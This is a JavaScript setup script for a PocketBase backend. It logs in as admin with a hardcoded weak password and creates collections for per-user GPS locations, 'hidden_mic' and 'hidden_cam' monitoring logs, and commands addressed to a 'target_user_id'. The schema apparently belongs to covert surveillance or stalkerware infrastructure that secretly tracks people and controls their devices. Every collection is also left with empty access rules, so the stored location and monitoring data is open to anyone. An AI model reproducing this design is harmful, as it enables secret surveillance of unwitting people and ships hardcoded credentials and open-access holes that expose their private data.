import PocketBase from 'pocketbase';

const pb = new PocketBase('http://127.0.0.1:8090');

async function setup() {
    try {
        console.log("Authenticating as admin...");
        try {
            await pb.collection('_superusers').authWithPassword('admin@fame.com', '1234567890');
        } catch (e) {
            await pb.admins.authWithPassword('admin@fame.com', '1234567890');
        }
        console.log("Authenticated.");

        // Check Locations
        try {
            await pb.collection('locations').getList(1, 1);
            console.log("✅ 'locations' collection exists.");
        } catch (e) {
            console.log("⚠️ 'locations' collection missing. Creating...");
            await pb.collections.create({
                name: 'locations',
                type: 'base',
                schema: [
                    { name: 'latitude', type: 'number', required: true },
                    { name: 'longitude', type: 'number', required: true },
                    { name: 'timestamp', type: 'date', required: true },
                    { name: 'user_id', type: 'relation', required: true, options: { collectionId: 'users', cascadeDelete: false, maxSelect: 1 } }
                ],
                listRule: '', viewRule: '', createRule: '', updateRule: '', deleteRule: '' // Public access for now
            });
            console.log("✅ Created 'locations'");
        }

        // Check Monitoring Logs
        try {
            await pb.collection('monitoring_logs').getList(1, 1);
            console.log("✅ 'monitoring_logs' collection exists.");
        } catch (e) {
            console.log("⚠️ 'monitoring_logs' collection missing. Creating...");
            await pb.collections.create({
                name: 'monitoring_logs',
                type: 'base',
                schema: [
                    { name: 'type', type: 'select', required: true, options: { values: ['hidden_mic', 'hidden_cam'] } },
                    { name: 'user_id', type: 'relation', required: true, options: { collectionId: 'users', cascadeDelete: false, maxSelect: 1 } }
                ],
                listRule: '', viewRule: '', createRule: '', updateRule: '', deleteRule: ''
            });
            console.log("✅ Created 'monitoring_logs'");
        }

        // Check Commands
        try {
            await pb.collection('commands').getList(1, 1);
            console.log("✅ 'commands' collection exists.");
        } catch (e) {
            console.log("⚠️ 'commands' collection missing. Creating...");
            await pb.collections.create({
                name: 'commands',
                type: 'base',
                schema: [
                    { name: 'type', type: 'text', required: true },
                    { name: 'target_user_id', type: 'relation', required: true, options: { collectionId: 'users', cascadeDelete: false, maxSelect: 1 } },
                    { name: 'status', type: 'select', required: true, options: { values: ['pending', 'completed', 'failed'] } }
                ],
                listRule: '', viewRule: '', createRule: '', updateRule: '', deleteRule: ''
            });
            console.log("✅ Created 'commands'");
        }

    } catch (err) {
        console.error("Setup failed:", err);
    }
}

setup();
